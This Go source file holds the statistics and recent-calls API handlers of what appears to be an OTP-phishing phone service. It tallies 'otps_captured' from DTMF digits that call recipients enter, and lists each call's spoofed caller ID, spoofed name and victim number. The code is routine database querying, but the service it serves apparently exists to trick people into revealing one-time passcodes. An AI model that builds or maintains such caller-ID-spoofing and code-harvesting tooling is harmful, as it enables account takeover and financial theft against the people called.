package handlers

import (
	"github.com/gofiber/fiber/v2"
	"github.com/jackc/pgx/v5/pgxpool"

	"hushcircuits/api/internal/database"
)

type StatsHandler struct {
	q    *database.Queries
	pool *pgxpool.Pool
}

func NewStatsHandler(pool *pgxpool.Pool) *StatsHandler {
	return &StatsHandler{q: database.NewQueries(pool), pool: pool}
}

func (h *StatsHandler) GetStats(c *fiber.Ctx) error {
	uid, ok := userID(c)
	if !ok {
		return c.Status(401).JSON(fiber.Map{"error": "unauthorized"})
	}
	var tc, tm, tt, oc int
	var sr float64

	if err := h.pool.QueryRow(c.Context(),
		`SELECT COUNT(*), COALESCE(SUM(duration_seconds),0)/60, COALESCE(SUM(tokens_cost),0) FROM calls WHERE user_id = $1`, uid).
		Scan(&tc, &tm, &tt); err != nil {
		return c.Status(500).JSON(fiber.Map{"error": "stats query failed"})
	}
	h.pool.QueryRow(c.Context(),
		`SELECT COUNT(*) FROM calls WHERE user_id = $1 AND status='completed' AND dtmf_captured!=''`, uid).Scan(&oc)
	if tc > 0 {
		h.pool.QueryRow(c.Context(),
			`SELECT ROUND(100.0*SUM(CASE WHEN status='completed' THEN 1 ELSE 0 END)/COUNT(*),1) FROM calls WHERE user_id = $1`, uid).Scan(&sr)
	}

	return c.JSON(fiber.Map{
		"total_calls": tc, "total_minutes": tm, "total_tokens": tt,
		"otps_captured": oc, "success_rate": sr,
	})
}

func (h *StatsHandler) GetRecentCalls(c *fiber.Ctx) error {
	uid, ok := userID(c)
	if !ok {
		return c.Status(401).JSON(fiber.Map{"error": "unauthorized"})
	}
	rows, err := h.q.GetCalls(c.Context(), uid, 10)
	if err != nil {
		return c.Status(500).JSON(fiber.Map{"error": "query failed"})
	}
	defer rows.Close()

	var calls []fiber.Map
	for rows.Next() {
		var id, scid, sname, dest, status, dtmf string
		var dur, tok int
		var cost float64
		var ca interface{}
		rows.Scan(&id, &scid, &sname, &dest, &status, &dur, &tok, &cost, &dtmf, &ca)
		calls = append(calls, fiber.Map{
			"id": id, "spoofed_caller_id": scid, "spoofed_name": sname,
			"destination_number": dest, "status": status, "duration_seconds": dur,
			"tokens_cost": tok, "cost_usd": cost, "dtmf_captured": dtmf, "created_at": ca,
		})
	}
	if calls == nil {
		calls = []fiber.Map{}
	}
	return c.JSON(fiber.Map{"calls": calls})
}
